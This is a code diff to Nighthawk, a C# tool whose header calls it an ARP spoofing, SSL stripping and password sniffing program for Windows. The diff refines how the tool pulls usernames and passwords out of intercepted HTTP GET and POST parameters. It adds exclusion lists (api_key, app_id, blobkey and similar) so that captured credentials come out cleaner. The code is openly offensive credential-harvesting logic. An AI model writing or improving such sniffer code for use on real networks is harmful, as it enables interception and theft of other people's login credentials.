@@ -8,7 +8,7 @@ using System.Threading;
 
 /**
 Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
-Copyright (C) 2010  Klemen Bratec
+Copyright (C) 2011  Klemen Bratec
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -86,10 +86,22 @@ namespace Nighthawk
             "geslo"
         };
 
+
+        // excluded field names - username
+        private string[] excludedFieldNamesUsername = new string[]
+        {
+            "api_key",
+            "app_id",
+            "blobheadername1"
+        };
+
         // excluded field names - password
         private string[] excludedFieldNamesPassword = new string[]
         {
-            "session_key_only"
+            "session_key_only",
+            "api_key",
+            "app_id",
+            "blobkey"
         };
 
         // constructor
@@ -265,9 +277,9 @@ namespace Nighthawk
             if (packet.Header.GetParams.Count > 0)
             {
                 foreach (string[] param in packet.Header.GetParams)
-                {
+                {              
                     // check for field names - username
-                    if (fieldNamesUser.Where(s => param[0].Contains(s)).Count() > 0 && user == string.Empty)
+                    if (fieldNamesUser.Where(s => param[0].Contains(s)).Count() > 0 && user == string.Empty && !excludedFieldNamesUsername.Contains(param[0]))
                     {
                         user = param[1];
                     }
@@ -297,7 +309,7 @@ namespace Nighthawk
                 foreach (string[] param in packet.PostParams)
                 {
                     // check for field names - username
-                    if (fieldNamesUser.Where(s => param[0].Contains(s)).Count() > 0 && user == string.Empty)
+                    if (fieldNamesUser.Where(s => param[0].Contains(s)).Count() > 0 && user == string.Empty && !excludedFieldNamesUsername.Contains(param[0]))
                     {
                         user = param[1];
                     }
